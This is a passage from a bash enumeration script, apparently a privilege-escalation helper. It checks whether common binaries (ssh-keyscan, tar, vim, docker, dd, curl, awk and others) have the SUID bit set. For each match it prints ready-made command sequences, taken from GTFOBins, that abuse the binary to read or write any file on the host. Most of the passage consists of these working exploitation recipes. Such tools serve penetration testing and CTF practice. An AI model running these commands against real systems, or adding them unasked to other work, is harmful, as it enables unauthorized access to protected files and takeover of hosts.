    binary=$(command -v ssh-keyscan)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'ssh-keyscan\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nssh-keyscan -f $LFILE\e[0m'
        fi
    fi

    binary=$(command -v ssh)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'ssh\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/ssh/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v strings)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'strings\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nstrings $LFILE\e[0m'
        fi
    fi

    binary=$(command -v sysctl)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'sysctl\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nsysctl -n "/../../$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v tac)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'tac\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ntac -s \'RANDOM\' "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v tail)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'tail\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ntail -c1G "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v tar)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'tar\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ntar xf "$LFILE" -I \'/bin/sh -c "cat 1>&2"\'\e[0m'
        fi
    fi

    binary=$(command -v tbl)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'tbl\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ntbl $LFILE\e[0m'
        fi
    fi

    binary=$(command -v tic)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'tic\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ntic -C "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v tmux)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'tmux\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/tmux/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v troff)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'troff\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ntroff $LFILE\e[0m'
        fi
    fi

    binary=$(command -v ul)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'ul\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nul "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v unexpand)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'unexpand\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nunexpand -t99999999 "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v uniq)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'uniq\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nuniq "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v uuencode)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'uuencode\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nuuencode "$LFILE" /dev/stdout | uudecode\e[0m'
        fi
    fi

    binary=$(command -v vi)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'vi\' has its SUID bit turned on. Read any file using the following command:\nvi file_to_read\e[0m'
        fi
    fi

    binary=$(command -v view)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'view\' has its SUID bit turned on. Read any file using the following command:\nview file_to_read\e[0m'
        fi
    fi

    binary=$(command -v vim)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'vim\' has its SUID bit turned on. Read any file using the following command:\nvim file_to_read\e[0m'
        fi
    fi

    binary=$(command -v vimdiff)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'vimdiff\' has its SUID bit turned on. Read any file using the following command:\nvimdiff file_to_read\e[0m'
        fi
    fi

    binary=$(command -v virsh)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'virsh\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/virsh/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v w3m)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'w3m\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nw3m "$LFILE" -dump\e[0m'
        fi
    fi

    binary=$(command -v wc)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'wc\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nwc --files0-from "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v wget)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'wget\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nwget -i $LFILE\e[0m'
        fi
    fi

    binary=$(command -v whiptail)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'whiptail\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nwhiptail --textbox --scrolltext "$LFILE" 0 0\e[0m'
        fi
    fi

    binary=$(command -v xargs)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'xargs\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nxargs -a "$LFILE" -0\e[0m'
        fi
    fi

    binary=$(command -v xelatex)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'xelatex\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/xelatex/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v xmodmap)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'xmodmap\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nxmodmap -v $LFILE\e[0m'
        fi
    fi

    binary=$(command -v xmore)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'xmore\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nxmore $LFILE\e[0m'
        fi
    fi

    binary=$(command -v xpad)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'xpad\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/xpad/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v xxd)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'xxd\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nxxd "$LFILE" | xxd -r\e[0m'
        fi
    fi

    binary=$(command -v xz)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'xz\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nxz -c "$LFILE" | xz -d\e[0m'
        fi
    fi

    binary=$(command -v yelp)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'yelp\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/yelp/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v zip)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'zip\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nTF=$(mktemp -u)\nzip $TF $LFILE\nunzip -p $TF\e[0m'
        fi
    fi

    binary=$(command -v zsh)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'zsh\' has its SUID bit turned on. Read any file using the following sequence of commands:\nexport LFILE=file_to_read\nzsh -c \'echo "$(<$LFILE)"\'\e[0m'
        fi
    fi

    binary=$(command -v zsoelim)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'zsoelim\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nzsoelim "$LFILE"\e[0m'
        fi
    fi

    if [[ $vulnerableFound -eq 0 ]]; then
        echo $'\n\e[36mNo file read vulnerabilities found.'
    fi
}

function write_file_exploit {
    writeVulnerableFound=0
    echo $'\n\n\e[1m\e[4m\e[33mFILE WRITE VULNERABILITIES\e[0m'

    binary=$(command -v arj)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'arj\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nTF=$(mktemp -d)\nLFILE=file_to_write (NOT INCLUDING THE DIRECTORY, ONLY BASENAME)\nLDIR=where_to_write\necho DATA > "$TF/$LFILE"\narj a "$TF/a" "$TF/$LFILE"\narj e "$TF/a" $LDIR\e[0m'
        fi
    fi

    binary=$(command -v ash)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'ash\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/ash/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v awk)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'awk\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\nawk -v LFILE=$LFILE \'BEGIN { print "DATA" > LFILE }\'\e[0m'
        fi
    fi

    binary=$(command -v bash)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'bash\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/bash/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v busybox)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'busybox\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/busybox/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v c89)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'c89\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/c89/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v c99)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'c99\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/c99/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v check_log)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'check_log\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/check_log/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v cp)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'cp\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\necho "DATA" | cp /dev/stdin "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v cpio)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'cpio\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/cpio/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v csh)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'csh\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/csh/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v csplit)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'csplit\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/csplit/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v csvtool)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'csvtool\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\nTF=$(mktemp)\necho DATA > $TF\ncsvtool trim t $TF -o $LFILE\e[0m'
        fi
    fi

    binary=$(command -v curl)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'curl\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\nTF=$(mktemp)\necho DATA > $TF\ncurl "file://$TF" -o "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v dash)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'dash\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/dash/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v dd)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'dd\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\necho "DATA" | dd of=$LFILE\e[0m'
        fi
    fi

    binary=$(command -v docker)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'docker\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nCONTAINER_ID="$(docker run -d alpine)"\nTF=$(mktemp)\necho "DATA" > $TF\ndocker cp $TF $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF file_to_write\e[0m'
        fi
    fi

    binary=$(command -v dos2unix)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'dos2unix\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE1=file_to_read\nLFILE2=file_to_write_to\ndos2unix -f -n "$LFILE1" "$LFILE2"\e[0m'
        fi
    fi

    binary=$(command -v dosbox)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'dosbox\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\ndosbox -c \'mount c /\' -c "echo DATA >c:$LFILE" -c exit\e[0m'
        fi
    fi

    binary=$(command -v easy_install)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'easy_install\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/easy_install/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v ed)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'ed\' has its SUID bit turned on. Write to any file using the following sequence of commands:\ned file_to_write\na\nDATA\n.\nw\nq\e[0m'
        fi
    fi

    binary=$(command -v elvish)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'elvish\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nexport LFILE=file_to_write\nelvish -c \'echo DATA >$E:LFILE\'\e[0m'
        fi
    fi

    binary=$(command -v emacs)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'emacs\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nemacs file_to_write\nDATA\nC-x C-s\e[0m'
        fi
    fi

    binary=$(command -v ex)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'ex\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/ex/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v exiftool)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'exiftool\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/exiftool/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v gawk)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            writeVulnerableFound=$((writeVulnerableFound + 1))
            echo $'\n\e[33m\e[1m('"$writeVulnerableFound"$')\e[0m\e[33m Binary \'gawk\' has its SUID bit turned on. Write to any file using the following sequence of commands:\nLFILE=file_to_write\ngawk -v LFILE=$LFILE \'BEGIN { print "DATA" > LFILE }\'\e[0m'
        fi
    fi

    binary=$(command -v gcc)
